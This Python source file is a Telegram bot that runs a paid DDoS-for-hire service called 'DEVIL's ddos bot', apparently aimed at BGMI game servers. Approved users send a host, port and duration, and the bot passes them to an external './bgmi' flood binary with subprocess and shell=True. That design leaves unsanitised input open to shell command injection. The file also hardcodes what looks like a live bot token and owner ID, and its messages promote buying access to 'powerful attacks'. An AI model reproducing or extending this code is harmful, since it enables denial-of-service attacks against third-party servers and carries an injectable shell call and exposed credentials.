#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7399086976:AAGv76Pj_Hd8OP9tnx-c_cAJui4DpWwn4Ds')

# Owner user ID
owner_id = "5840697769"

# Admin user IDs
admin_ids = [""]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store admin IDs
ADMIN_FILE = "admins.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read admin IDs from the file
def read_admins():
    try:
        with open(ADMIN_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []
# Load allowed user and admin IDs
allowed_user_ids = read_users()
admin_ids = read_admins()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit in ["hour", "hours"]:
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit in ["day", "days"]:
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit in ["week", "weeks"]:
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit in ["month", "months"]:
        expiry_date = current_time + datetime.timedelta(days=30 * duration)
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['approve'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()
                if time_unit not in ['hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months']:
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.send_message(message.chat.id, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} approved successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. "
                    "To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n"
                    "🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your capabilities!\n\n"
                    "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")


    bot.send_message(message.chat.id, response)

# Command handler for removing a user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>😘'''
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. "
                    "To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n"
                    "🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your capabilities!\n\n"
                    "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")


    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. "
                    "To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n"
                    "🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your capabilities!\n\n"
                    "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")

    bot.send_message(message.chat.id, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. "
                    "To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n"
                    "🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your capabilities!\n\n"
                    "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")

    bot.send_message(message.chat.id, response)


# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
            
    response = f"🚀Attack Sent Successfully! 🚀\n\n🗿𝐓𝐚𝐫𝐠𝐞𝐭: {target}:{port}\n🕦Attack Duration: {time}\n💣Method: @xiDEVIL\n\n🔥Status: Attack in Progress... 🔥"
    bot.send_message(message.chat.id, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

# Handler for /attack command and direct attack input
@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is not an admin or owner
        if user_id not in admin_ids and user_id != owner_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        # Check if the message starts with '/attack' or not
        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
            # If it doesn't start with '/', assume it's an attack command and adjust the command list
            if not message.text.startswith('/'):
                command = ['/attack'] + command  # Prepend '/attack' to the command list
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 300:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./bgmi {target} {port} {time} 280"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response ="Please provide attack in the following format:\n\n<host> <port> <time>" 
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. "
                    "To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n"
                    "🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your capabilities!\n\n"
                    "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")

    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['start', 'menu'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = telebot.types.KeyboardButton('🚀Attack')
    markup.add(btn1)
    bot.send_message(message.chat.id, "Welcome To DEVIL'𝐬 𝐝𝐝𝐨𝐬 𝐛𝐨𝐭  Please choose an option:", reply_markup=markup)



# Function to handle Attack button
@bot.message_handler(func=lambda message: message.text == '🚀Attack')
def handle_attack_button(message):
    bot.reply_to(message, "To use the attack command, type it in the following format:\n\n/attack <host> <port> <time>")

# Start the bot
bot.polling()